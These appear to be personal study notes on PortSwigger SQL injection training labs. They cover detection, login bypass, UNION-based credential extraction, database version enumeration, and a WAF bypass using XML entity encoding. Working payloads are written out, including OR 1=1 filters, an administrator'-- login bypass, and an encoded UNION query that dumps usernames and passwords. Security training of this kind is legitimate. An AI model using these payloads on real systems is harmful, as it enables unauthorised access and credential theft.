# SQL Injection labs

Usually appears in `WHERE` clause of a `SELECT` query, can appear in others like:
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER` BY clause


**Cheatsheet**

https://portswigger.net/web-security/sql-injection/cheat-sheet

- Use `'` as the input and look for errors or anomalies
- Boolean conditions like `OR 1=1` and `OR 1=2`
- Payloads deisgned to trigger time delays, look for response time differences
- OAST payloads


## Retrieving hidden data

**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Basic web store frontend, filters products based on id and category

Product id doesn't appear to be injectable, attempts fail with "Invalid product ID"

Category does appear to be injectable, using `'` as the input causes an internal server error

Use GET request to `/filter?category=` to inject SQL

The following payloads work:

```
# Can be destructive if UPDATE or DELETE are used
/filter?category='+OR+1=1--
/filter?category='+OR+True--

# Requires knowledge of the column name
/filter?category='+AND+released=0--
```

## Subverting application logic

**Lab: SQL injection vulnerability allowing login bypass**

Basic web store page, login path at `/login`

POST request form parameters are `csrf`, `username` and `password`

Username parameter is injectable and authentication can be bypassed with `administrator'--` as the username and any password

## Retrieving data from other database tables

Use `UNION` to pull data from other tables i.e.

`' UNION SELECT * FROM users--`

More info on union attacks: https://portswigger.net/web-security/sql-injection/union-attacks

## Blind SQl injection vulnerabilities

The application returns no results from the query, use the following:

- Change the query to trigger a difference in the app's response
- Trigger a time delay
- Trigger out-of-band network interaction using OAST techniques

More info: https://portswigger.net/web-security/sql-injection/blind

## Second-order SQL injection AKA Stored SQL injection

Use stored values like user names to trigger an injection when the values are retrieved from the database and used in subsequent queries

## Examining the database

After identifying a SQLi we can use queries to enumerate the database

More info: https://portswigger.net/web-security/sql-injection/examining-the-database

| Database type | Query |
|---------------|-------|
| Microsoft, MySQL | SELECT @@version |
| Oracle | SELECT * FROM v$version |
| PostgreSQL | SELECT version() |

**Lab: SQL injection attack, querying the database type and version on Oracle**

Injection vulnerability in the product category filter, use a UNION to get the database version

Confirm injection and determine how many columns our UNION query needs to return using dummy values and the built-in table `dual`

```sql
UNION SELECT 'a' FROM dual--
UNION SELECT 'a', 'b' FROM dual--
UNION SELECT 'a', 'b', 'c' FROM dual--
```

Dump the version

```sql
UNION SELECT BANNER,NULL FROM v$version--
```

## SQL injection in different contexts

**Lab: SQL injection with filter bypass via XML encoding**

Basic web store, products have a stock check feature that allows the user to check the stock number in various locations.

The stock checker sends an XML payload in a POST request to /product/stock

Stock check payload is injectable, we can test this by adding or subtracting from the storeId or productId

When we try to UNION the users table we get blocked by the WAF

We can bypass the WAF by using Unicode character encodings for the following query appended to the storeId or productId to retrieve the username and password

```sql
1 UNION SELECT username, password FROM users
```

This doesn't work as the web app expects a single column, so we need to use column concatenation to retrieve the username and password as a single column

```sql
1 UNION SELECT username || '~' || password FROM users 
```

Encoded:

```
&#x31;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x7C;&#x7C;&#x20;&#x27;&#x7E;&#x27;&#x20;&#x7C;&#x7C;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x55;&#x53;&#x45;&#x52;&#x53;
```

Python util for escaping characters https://docs.python.org/3/library/xml.sax.utils.html

